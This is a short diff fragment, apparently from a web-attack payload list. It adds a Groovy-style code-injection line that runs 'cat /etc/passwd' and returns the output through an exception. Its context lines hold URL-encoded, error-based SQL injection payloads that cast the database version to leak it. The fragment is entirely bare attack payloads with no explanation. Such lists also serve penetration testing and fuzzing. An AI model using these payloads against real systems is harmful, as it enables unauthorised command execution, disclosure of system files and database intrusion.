@@ -1,3 +1,5 @@
+throw new Exception(\"cat /etc/passwd\".execute().text
+
 %6c%75%33%6b%79%31%33' AND 1=CAST((SELECT version()) AS int) --
  (CAST((SELECT version()) AS int) = '')
 
